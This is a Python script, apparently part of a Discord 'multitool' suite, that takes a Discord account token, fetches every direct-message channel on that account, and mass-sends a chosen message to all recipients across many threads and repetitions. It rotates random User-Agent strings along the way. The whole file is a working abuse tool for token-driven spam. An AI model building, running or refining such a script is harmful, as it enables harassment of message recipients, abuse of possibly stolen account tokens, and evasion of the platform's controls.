# Copyright (c) 2025 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    import requests
    import threading
    import time
except Exception as e:
    MissingModule(e)

Title("Discord Token Mass Dm")
Connection()

try:
    token = ChoiceToken()

    message = input(f"{INPUT} Message {red}->{reset} ")
    if not message:
        ErrorInput()

    try:
        repetitions = int(input(f"{INPUT} Repetitions {red}->{reset} ").strip())
    except:
        ErrorNumber()

    if repetitions <= 0:
        ErrorNumber()

    print(f"{LOADING} Sending Dm..", reset)

    def MassDm(token, channels, message):
        for channel in channels:
            for user in [x["username"] for x in channel.get("recipients", [])]:
                try:
                    headers  = {"Authorization": token, "Content-Type": "application/json", "User-Agent": RandomUserAgents()}
                    response = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers, json={"content": message})
                    if response.status_code in [200, 201]:
                        print(f"{SUCCESS} Status:{red} Sent   {white}| Username:{red} {user}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed {white}| Username:{red} {user}", reset)
                except:
                    print(f"{ERROR} Status:{red} Error  {white}| Username:{red} {user}", reset)
                time.sleep(0.1)

    channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token}).json()

    if not channel_ids:
        print(f"{ERROR} No Dm found!", reset)
        Continue()
        Reset()

    threads = []
    for _ in range(repetitions):
        for channel in [channel_ids[j:j+3] for j in range(0, len(channel_ids), 3)]:
            t = threading.Thread(target=MassDm, args=(token, channel, message))
            t.start()
            threads.append(t)
            time.sleep(0.1)

    for thread in threads:
        thread.join()

    Continue()
    Reset()

except Exception as e:
    Error(e)